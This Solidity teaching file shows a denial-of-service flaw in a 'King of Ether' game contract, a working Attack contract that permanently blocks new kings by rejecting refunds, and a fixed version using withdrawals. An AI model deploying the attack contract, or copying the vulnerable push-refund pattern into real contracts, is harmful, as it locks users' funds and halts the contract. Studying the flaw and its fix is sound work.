// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingOfEther {
    /*
    The goal of KingOfEther is to become the king by sending more Ether than
    the previous king. Previous king will be refunded with the amount of Ether
    he sent. The attacker attacks KingOfEther contract by sending more ether than previous kings.
    After KingOfEther contract is attacked, the current king becomes the Attack contract and 
    no one can become the new king. 
    Now that Attack is the king, all new challenge to claim the throne will be rejected
    since Attack contract does not have a fallback function, denying to accept the
    Ether sent from KingOfEther before the new king is set.
    */
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

//To prevent this allow users to withdraw their Ether instead of sending it.

contract KingOfEtherPrevention {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
